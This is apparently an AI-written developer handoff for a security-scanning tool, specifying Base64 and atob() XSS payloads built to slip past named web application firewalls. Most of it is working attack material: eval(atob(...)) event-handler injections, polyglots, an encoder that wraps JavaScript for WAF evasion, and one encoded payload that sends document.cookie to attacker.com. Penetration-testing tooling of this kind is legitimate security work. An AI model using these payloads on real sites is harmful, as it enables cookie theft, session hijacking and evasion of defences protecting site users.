# Handoff: XSS Base64 Encoding & atob() Bypass Techniques

**Date**: 2026-01-21
**Author**: Claude (Opus 4.5)
**Priority**: HIGH
**Estimated Effort**: Low (30-45 minutes)
**Target Files**:
- `bugtrace/data/xss_batches/waf_bypass.txt`
- `bugtrace/data/xss_batches/polyglots.txt`
- `bugtrace/tools/waf/encodings.py`

---

## 1. Problem Statement

Many modern WAFs block common XSS patterns like `<script>`, `alert(`, `onerror=`, etc. However, they often **do not decode Base64** before pattern matching. This creates a significant bypass opportunity.

### Current State

The framework has basic encoding techniques but **lacks Base64-based XSS payloads**:

```python
# In encodings.py - Base64 exists but only for generic contexts
EncodingTechnique(
    name="base64_encode",
    description="Base64 encoding (for specific contexts)",
    encoder=self._base64_encode,
    effective_against=["generic"],
    priority=10
)
```

**Missing**: Payloads that use `atob()` or `eval(atob(...))` to decode and execute at runtime.

---

## 2. Implementation Details

### 2.1 Add Base64 XSS Payloads to `waf_bypass.txt`

Append these payloads at the end of `bugtrace/data/xss_batches/waf_bypass.txt`:

```html
# ================================================================
# BASE64 ENCODED XSS (WAF Bypass via atob())
# ================================================================
# Pattern: eval(atob('base64_encoded_js'))
# Why it works: WAF sees "atob" but not the decoded payload

# alert(1) = YWxlcnQoMSk=
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
<svg onload=eval(atob('YWxlcnQoMSk='))>
<body onload=eval(atob('YWxlcnQoMSk='))>
<input onfocus=eval(atob('YWxlcnQoMSk=')) autofocus>
<marquee onstart=eval(atob('YWxlcnQoMSk='))>

# alert(document.domain) = YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==
<img src=x onerror=eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))>

# alert(document.cookie) = YWxlcnQoZG9jdW1lbnQuY29va2llKQ==
<img src=x onerror=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>

# fetch('https://attacker.com/'+document.cookie) = ZmV0Y2goJ2h0dHBzOi8vYXR0YWNrZXIuY29tLycrZG9jdW1lbnQuY29va2llKQ==
<img src=x onerror=eval(atob('ZmV0Y2goJ2h0dHBzOi8vYXR0YWNrZXIuY29tLycrZG9jdW1lbnQuY29va2llKQ=='))>

# ================================================================
# ALTERNATIVE BASE64 EXECUTION METHODS
# ================================================================
# Using Function() constructor instead of eval()
<img src=x onerror=Function(atob('YWxlcnQoMSk='))()>
<svg onload=Function(atob('YWxlcnQoMSk='))()>

# Using setTimeout with base64
<img src=x onerror=setTimeout(atob('YWxlcnQoMSk='))>

# Using setInterval with base64
<img src=x onerror=setInterval(atob('YWxlcnQoMSk='),1000)>

# ================================================================
# DOUBLE ENCODING (Base64 + URL encode the wrapper)
# ================================================================
<img src=x onerror=%65%76%61%6c(atob('YWxlcnQoMSk='))>
<svg onload=%46%75%6e%63%74%69%6f%6e(atob('YWxlcnQoMSk='))()>

# ================================================================
# BASE64 WITH TEMPLATE LITERALS (ES6)
# ================================================================
<img src=x onerror=eval(atob`YWxlcnQoMSk=`)>
<svg onload=Function(atob`YWxlcnQoMSk=`)()>

# ================================================================
# INTERACTSH OOB WITH BASE64
# ================================================================
# fetch('{{interactsh_url}}') = ZmV0Y2goJ3t7aW50ZXJhY3RzaF91cmx9fScp (placeholder)
<img src=x onerror=eval(atob('ZmV0Y2goJ3t7aW50ZXJhY3RzaF91cmx9fScp'))>
```

### 2.2 Add Base64 Polyglots to `polyglots.txt`

Append to `bugtrace/data/xss_batches/polyglots.txt`:

```html
# ================================================================
# BASE64 POLYGLOTS
# ================================================================
# Combines multiple execution contexts with base64

# Multi-event base64 polyglot
"><img src=x onerror=eval(atob('YWxlcnQoMSk='))><svg onload=eval(atob('YWxlcnQoMSk='))>

# Attribute breakout + base64
" onmouseover=eval(atob('YWxlcnQoMSk=')) "

# Script context + base64
';eval(atob('YWxlcnQoMSk='));//
</script><script>eval(atob('YWxlcnQoMSk='))</script>

# Mixed encoding polyglot (base64 + unicode)
<img src=x onerror=\u0065val(atob('YWxlcnQoMSk='))>
```

### 2.3 Update `encodings.py` - Add XSS-Specific Base64 Encoder

In `bugtrace/tools/waf/encodings.py`, modify the `_base64_encode` method and add a new XSS-specific encoder:

```python
def _base64_encode_xss(self, payload: str) -> str:
    """
    Wrap XSS payload in atob() for WAF bypass.
    <script>alert(1)</script> -> <img src=x onerror=eval(atob('YWxlcnQoMSk='))>
    """
    import re

    # Extract JS code from common patterns
    js_code = None

    # Pattern: <script>CODE</script>
    match = re.search(r'<script[^>]*>(.*?)</script>', payload, re.IGNORECASE | re.DOTALL)
    if match:
        js_code = match.group(1)

    # Pattern: onerror=CODE or onload=CODE etc.
    if not js_code:
        match = re.search(r'on\w+\s*=\s*["\']?([^"\'>\s]+)', payload, re.IGNORECASE)
        if match:
            js_code = match.group(1)

    if not js_code:
        # Can't extract, return original
        return payload

    # Encode the JS code
    encoded_js = base64.b64encode(js_code.encode()).decode()

    # Return as img/onerror with atob
    return f"<img src=x onerror=eval(atob('{encoded_js}'))>"
```

Add this to the techniques list in `_build_techniques()`:

```python
EncodingTechnique(
    name="base64_xss_wrap",
    description="Wrap JS in atob() for XSS WAF bypass",
    encoder=self._base64_encode_xss,
    effective_against=["cloudflare", "akamai", "aws_waf", "modsecurity"],
    priority=5  # Higher priority for XSS contexts
),
```

---

## 3. Verification Checklist

After implementation, verify:

- [ ] `waf_bypass.txt` contains 15+ new base64 payloads
- [ ] `polyglots.txt` contains 4+ base64 polyglots
- [ ] `encodings.py` has new `base64_xss_wrap` technique
- [ ] Syntax validation: `python3 -m py_compile bugtrace/tools/waf/encodings.py`
- [ ] Test payload decoding: `echo 'YWxlcnQoMSk=' | base64 -d` should output `alert(1)`

---

## 4. Testing

### Manual Test

```bash
# Test that payloads are loaded
python3 -c "
from pathlib import Path
payloads = Path('bugtrace/data/xss_batches/waf_bypass.txt').read_text()
assert 'atob' in payloads, 'Base64 payloads not found'
print('✓ Base64 payloads present')
"
```

### Integration Test

```bash
# Run against a test target (dojo or controlled environment)
./bugtraceai-cli scan "http://127.0.0.1:5055/v1/xss_test?q=test" --agents xss_agent
```

---

## 5. Base64 Encoding Reference

For creating new payloads, use this quick reference:

| Original JS | Base64 Encoded |
|-------------|----------------|
| `alert(1)` | `YWxlcnQoMSk=` |
| `alert(document.domain)` | `YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==` |
| `alert(document.cookie)` | `YWxlcnQoZG9jdW1lbnQuY29va2llKQ==` |
| `confirm(1)` | `Y29uZmlybSgxKQ==` |
| `prompt(1)` | `cHJvbXB0KDEp` |
| `console.log(1)` | `Y29uc29sZS5sb2coMSk=` |

Generate new encodings:
```bash
echo -n 'YOUR_JS_CODE' | base64
```

---

## 6. Why This Works

1. **WAF Pattern Matching**: WAFs look for `alert(`, `document.cookie`, `<script>` etc.
2. **Base64 Obfuscation**: `YWxlcnQoMSk=` doesn't match any malicious patterns
3. **Runtime Decoding**: `atob()` decodes at runtime in the browser
4. **Execution Wrappers**: `eval()`, `Function()`, `setTimeout()` execute the decoded string

---

## 7. Success Criteria

The implementation is successful when:
1. XSSAgent can bypass WAFs that block `alert(` by using `atob('YWxlcnQoMSk=')`
2. Q-Learning records `base64_xss_wrap` as effective against tested WAFs
3. New payloads appear in the adaptive batching system

